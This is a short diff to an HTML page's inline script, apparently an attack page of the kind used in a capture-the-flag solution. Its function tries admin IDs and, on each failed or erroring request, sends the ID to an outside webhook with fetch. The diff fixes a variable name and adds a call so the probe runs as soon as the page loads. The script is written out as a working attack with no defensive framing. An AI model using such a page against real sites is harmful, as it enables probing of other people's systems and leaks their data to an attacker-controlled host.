@@ -16,7 +16,7 @@ function tryId(i) {
     })
     .then(res => {
         if (!res.ok) {
-            fetch(WEBHOOK + "?admin=" + id);
+            fetch(WEBHOOK + "?admin=" + i);
             return;
         }
         return res.text(); 
@@ -27,10 +27,10 @@ function tryId(i) {
         }
     })
     .catch(() => {
-        fetch(WEBHOOK + "?admin=" + id);
+        fetch(WEBHOOK + "?admin=" + i);
     });
 }
-
+tryId(0);
 </script>
 </body>
 </html>
